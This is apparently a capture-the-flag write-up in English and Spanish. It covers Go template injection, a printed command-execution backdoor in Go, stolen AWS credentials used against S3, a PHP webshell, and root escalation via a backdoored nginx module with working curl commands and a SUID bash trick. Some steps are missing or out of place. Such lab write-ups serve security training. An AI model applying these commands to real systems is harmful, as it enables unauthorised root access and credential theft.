Exploitation Summary

The attack begins with reconnaissance, where a Go-powered web application on port 8080 is identified. The page title on port 80 leaks a Go template placeholder ({{.Title}}), hinting at a Server-Side Template Injection vulnerability. The forgot password functionality on the login page reflects user input, and by intercepting the request with Burp Suite and bypassing the frontend email validation, the full Go template context is exposed, confirming the SSTI vector.

After logging in with credentials found via SSTI enumeration, the application source code reveals a DebugCmd backdoor function capable of running arbitrary OS commands. By invoking this function through the template injection, command execution is achieved as root inside what appears to be a container. From there, AWS credentials are discovered in /root/.aws/credentials, which are used to authenticate against a LocalStack S3 instance running on port 4566.

The S3 bucket website contains the files served on port 80. A PHP webshell is uploaded to the bucket, which the web server executes, granting a reverse shell as www-data on the host machine. Post-exploitation enumeration reveals a locally-bound nginx server on port 8000 configured with a custom, modified ngx_http_execute_module backdoor module. The default trigger keyword has been changed to ippsec.run, but once identified via strings, it can be used to execute commands as root. A SUID bit is set on /bin/bash via this backdoor, completing the privilege escalation.

Port 8080 hosts a login form and a /forgot password reset page, but no valid credentials are known yet. Port 4566 returns a 403 Forbidden for all paths but is worth revisiting once credentials are found.

Source Code Disclosure — DebugCmd Backdoor

Logging in with the discovered credentials doesn't lead to a normal dashboard — instead, the response contains what appears to be the Go application's source code. Inside, a particularly interesting function stands out:

func (u User) DebugCmd(test string) string {
    ipp := strings.Split(test, " ")
    bin := strings.Join(ipp[:1], " ")
    args := strings.Join(ipp[1:], " ")
    if len(args) > 0 {
        out, _ := exec.Command(bin, args).CombinedOutput()
        return string(out)
    } else {
        out, _ := exec.Command(bin).CombinedOutput()
        return string(out)
    }
}

The DebugCmd method on the User struct accepts a string, splits it into a binary and arguments, and directly executes it via exec.Command. This is a classic command execution backdoor. Since it is a method on a User object and the template engine can call methods on reflected objects, it is callable directly through SSTI.

Using the Go template injection vector in the forgot password form, the DebugCmd method can be invoked to run arbitrary commands on the server:

The command output shows the process is running as root. However, attempts to send a reverse shell through various methods fail, which — combined with the direct root access — strongly suggests this is a containerised environment rather than the actual host machine.

Privilege Escalation — NginxExecute Backdoor Module

Enumerating the local system, port 8000 is found listening only on localhost (127.0.0.1:8000). Inspecting /etc/nginx/sites-enabled/default reveals an unusual nginx server block configuration for this port:

server {
    listen 127.0.0.1:8000;
    location / {
        command on;
    }
}

The command on directive is not a standard nginx option. Investigating the loaded nginx modules reveals why:

cat /etc/nginx/modules-enabled/50-backdoor.conf
load_module modules/ngx_http_execute_module.so;

This is the NginxExecute module — a known nginx module that enables HTTP-triggered command execution. According to its documentation, commands are passed via query string using the system.run[cmd] syntax. However, trying this directly returns an empty response:

curl localhost:8000/?system.run[id]
curl: (52) Empty reply from server

The module is loaded but not responding as expected. The compiled .so file may have been modified. Locating and inspecting it with strings reveals the answer:

find / -iname "*ngx_http*" 2>/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
strings /usr/lib/nginx/modules/ngx_http_execute_module.so | grep run
ippsec.run

The module has been recompiled with a custom trigger keyword: ippsec.run instead of the default system.run. Using this keyword, the module responds correctly and executes commands as root:

curl 'localhost:8000/?ippsec.run[id]'
uid=0(root) gid=0(root) groups=0(root)

Commands with spaces or special characters need to be URL-encoded, since they would otherwise break the URL parsing. A small helper script is placed in /tmp/xd.sh to chain commands. First, it is tested with a simple id:

curl 'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'
uid=0(root) gid=0(root) groups=0(root)

The script is then updated to set the SUID bit on /bin/bash:

echo 'chmod u+s /bin/bash' > /tmp/xd.sh
curl 'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'

With the SUID bit set on /bin/bash, a privileged shell is spawned using the -p flag, which preserves the effective UID:

bash -p
bash-5.0# whoami
root

Full root access on the host machine is achieved. The root flag can now be retrieved.

Resumen de Explotación

El ataque comienza con reconocimiento, donde se identifica una aplicación web en Go en el puerto 8080. El título de la página del puerto 80 filtra un marcador de plantilla de Go ({{.Title}}), insinuando una vulnerabilidad de Server-Side Template Injection. La funcionalidad forgot password de la página de login refleja la entrada del usuario, y al interceptar la petición con Burp Suite y saltarse la validación de email del frontend, se expone el contexto completo de la plantilla Go, confirmando el vector SSTI.

Tras iniciar sesión con las credenciales descubiertas mediante la enumeración SSTI, el código fuente de la aplicación revela una función backdoor DebugCmd capaz de ejecutar comandos arbitrarios del sistema operativo. Invocando esta función a través de la inyección de plantilla se consigue ejecución de comandos como root dentro de lo que parece ser un contenedor. Desde allí, se descubren credenciales de AWS en /root/.aws/credentials, que se utilizan para autenticarse contra una instancia de LocalStack S3 corriendo en el puerto 4566.

El bucket S3 website contiene los archivos servidos en el puerto 80. Se sube una webshell PHP al bucket, que el servidor web ejecuta, otorgando una reverse shell como www-data en la máquina host. La enumeración post-explotación revela un servidor nginx vinculado localmente en el puerto 8000 configurado con un módulo backdoor ngx_http_execute_module personalizado y modificado. La palabra clave disparadora por defecto ha sido cambiada a ippsec.run, pero una vez identificada mediante strings, puede utilizarse para ejecutar comandos como root. Divulgación de Código Fuente — Backdoor DebugCmd

Iniciar sesión con las credenciales descubiertas no conduce a un panel de control normal — en cambio, la respuesta contiene lo que parece ser el código fuente de la aplicación Go. En su interior, destaca una función especialmente interesante:

func (u User) DebugCmd(test string) string {
    ipp := strings.Split(test, " ")
    bin := strings.Join(ipp[:1], " ")
    args := strings.Join(ipp[1:], " ")
    if len(args) > 0 {
        out, _ := exec.Command(bin, args).CombinedOutput()
        return string(out)
    } else {
        out, _ := exec.Command(bin).CombinedOutput()
        return string(out)
    }
}

El método DebugCmd del struct User acepta una cadena, la divide en un binario y sus argumentos, y lo ejecuta directamente mediante exec.Command. Es un backdoor de ejecución de comandos clásico. Como es un método sobre un objeto User y el motor de plantillas puede invocar métodos sobre objetos reflejados, es invocable directamente a través del SSTI.

Escalada de Privilegios — Módulo Backdoor NginxExecute

Enumerando el sistema local, se encuentra el puerto 8000 escuchando únicamente en localhost (127.0.0.1:8000). Inspeccionando /etc/nginx/sites-enabled/default se revela un bloque de servidor nginx inusual para este puerto:

server {
    listen 127.0.0.1:8000;
    location / {
        command on;
    }
}

La directiva command on no es una opción estándar de nginx. Investigando los módulos cargados de nginx se revela el motivo:

cat /etc/nginx/modules-enabled/50-backdoor.conf
load_module modules/ngx_http_execute_module.so;

Este es el módulo NginxExecute — un módulo de nginx conocido que permite la ejecución de comandos disparada por HTTP. Según su documentación, los comandos se pasan mediante la query string usando la sintaxis system.run[cmd]. Sin embargo, intentarlo directamente devuelve una respuesta vacía:

curl localhost:8000/?system.run[id]
curl: (52) Empty reply from server

El módulo está cargado pero no responde como se esperaba. El archivo .so compilado puede haber sido modificado. Localizarlo e inspeccionarlo con strings revela la respuesta:

find / -iname "*ngx_http*" 2>/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
strings /usr/lib/nginx/modules/ngx_http_execute_module.so | grep run
ippsec.run

El módulo ha sido recompilado con una palabra clave disparadora personalizada: ippsec.run en lugar del system.run por defecto. Usando esta palabra clave, el módulo responde correctamente y ejecuta comandos como root:

curl 'localhost:8000/?ippsec.run[id]'
uid=0(root) gid=0(root) groups=0(root)

Los comandos con espacios o caracteres especiales necesitan estar codificados en URL, ya que de lo contrario romperían el parseo de la URL. Se coloca un pequeño script auxiliar en /tmp/xd.sh para encadenar comandos. Primero se prueba con un simple id:

curl 'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'
uid=0(root) gid=0(root) groups=0(root)

El script se actualiza a continuación para activar el bit SUID en /bin/bash:

echo 'chmod u+s /bin/bash' > /tmp/xd.sh
curl 'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'

Con el bit SUID activado en /bin/bash, se lanza un shell privilegiado usando el flag -p, que preserva el UID efectivo:

bash -p
bash-5.0# whoami
root

Se consigue acceso root completo en la máquina host. La flag de root puede recuperarse ahora.
